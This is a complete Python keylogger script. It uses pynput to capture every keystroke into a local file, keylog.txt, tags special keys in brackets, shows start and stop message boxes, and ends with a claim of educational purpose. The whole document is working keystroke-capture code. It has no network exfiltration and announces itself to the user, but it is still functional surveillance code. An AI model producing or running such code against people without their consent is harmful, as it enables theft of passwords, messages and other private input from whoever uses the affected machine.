from pynput.keyboard import Listener, Key
from tkinter import messagebox
def write_to_file(key):
    try:
        with open("keylog.txt", "a") as file:
            file.write(key.char)
    except AttributeError:
        with open("keylog.txt", "a") as file:
            if key == Key.space:
                file.write(" ")
            elif key == Key.enter:
                file.write("\n")
            elif key == Key.tab:
                file.write("[TAB]")
            elif key == Key.backspace:
                file.write("[BACKSPACE]")
            elif key == Key.shift_l or key == Key.shift_r:
                file.write("[SHIFT]")
            elif key == Key.caps_lock:
                file.write("[CAPSLOCK]")
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                file.write("[CTRL]")
            elif key == Key.alt_l or key == Key.alt_r:
                file.write("[ALT]")
            elif key == Key.delete:
                file.write("[DELETE]")
            elif key == Key.esc:
                file.write("[ESC]")
            elif key == Key.up:
                file.write("[UP]")
            elif key == Key.down:
                file.write("[DOWN]")
            elif key == Key.left:
                file.write("[LEFT]")
            elif key == Key.right:
                file.write("[RIGHT]")
            elif key == Key.f1:
                file.write("[F1]")
            elif key == Key.f2:
                file.write("[F2]")
            elif key == Key.f3:
                file.write("[F3]")
            elif key == Key.f4:
                file.write("[F4]")
            elif key == Key.f5:
                file.write("[F5]")
            elif key == Key.f6:
                file.write("[F6]")
            elif key == Key.f7:
                file.write("[F7]")
            elif key == Key.f8:
                file.write("[F8]")
            elif key == Key.f9:
                file.write("[F9]")
            elif key == Key.f10:
                file.write("[F10]")
            elif key == Key.f11:
                file.write("[F11]")
            elif key == Key.f12:
                file.write("[F12]")
            elif key == Key.home:
                file.write("[HOME]")
            elif key == Key.end: 
                file.write("[END]")
            elif key == Key.page_up:
                file.write("[PAGE_UP]")
            elif key == Key.page_down:
                file.write("[PAGE_DOWN]")
            elif key == Key.print_screen:
                file.write("[PRINT_SCREEN]")
            elif key == Key.scroll_lock:
                file.write("[SCROLL_LOCK]")
            elif key == Key.pause:
                file.write("[PAUSE]")
            elif key == Key.num_lock:
                file.write("[NUM_LOCK]")
            elif key == Key.insert:
                file.write("[INSERT]")
            elif key == Key.menu:
                file.write("[MENU]")
            elif key == Key.windows:
                file.write("[WINDOWS]")
            else:
                file.write(f"[{key}]")
def on_press(key):
    if key == Key.esc:
        messagebox.showinfo("Keylogger", "Keylogger stopped. \nCheck keylog.txt for recorded keys.")
        return False
    write_to_file(key)
messagebox.showinfo("Keylogger", "Keylogger started. \nPress ESC to stop.")
with Listener(on_press=on_press) as listener:
    listener.join()
print("\nThis program is only for the educational purpose.")